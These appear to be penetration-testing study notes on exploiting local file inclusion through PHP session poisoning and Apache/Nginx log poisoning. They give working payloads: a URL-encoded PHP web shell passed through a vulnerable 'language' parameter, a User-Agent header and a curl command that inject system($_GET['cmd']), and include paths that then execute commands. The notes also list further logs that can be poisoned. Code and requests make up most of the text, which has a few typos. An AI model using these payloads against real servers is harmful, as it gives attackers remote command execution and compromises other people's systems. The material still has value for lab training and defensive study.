
### PHP Session Poisoning

PHPSESSION cookie information is stored in session files on the back-end, /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows.

The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix.

1) First thing is to grab the PHSESSION id.

2) Poison the vulnerable input with a URL encoded PHP reverse shell:

```
/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

3) Then poison the log with whatever command you want in the session log:

```
/index.php?language=/var/lib/php/sessions/sess_<PHPSESSION ID>&cmd=id
```

Will have to rerun the poison for additional runs.


### Server Log Poisoning

The poisoning will come through the User-Agent header since we can control it.

Logs are stored in access.log or error.log

By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations.

1) User burp to change the User-Agent to a php shell

```http
User-Agent: <?php system($_GET['cmd']); ?>
```

Log Poisoning can also be done via curl

```cli
curl -s "http://SERVER_IP:PORT/index.php" -A "<?php system($_GET['cmd']); ?>"
```

With either manual change or curl, cmd execution is available at the log.

```
/var/log/apache2/access.log&cmd=i
```

 Other logs that can be poisoned:

```
/var/log/sshd.log

/var/log/mail

/var/log/vsftpd.log
```
